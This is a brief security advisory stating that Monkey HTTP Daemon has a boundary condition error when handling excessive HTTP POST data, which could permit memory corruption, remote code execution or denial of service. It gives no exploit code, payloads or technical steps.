Monkey HTTP Daemon is prone to a boundary condition error. This condition occurs when the server attempts to handle excessive HTTP POST data. Exploitation could allow a remote attacker to corrupt sensitive regions of memory with attacker-supplied values, resulting in code execution. Exploitation attempts may also result in a denial of service.
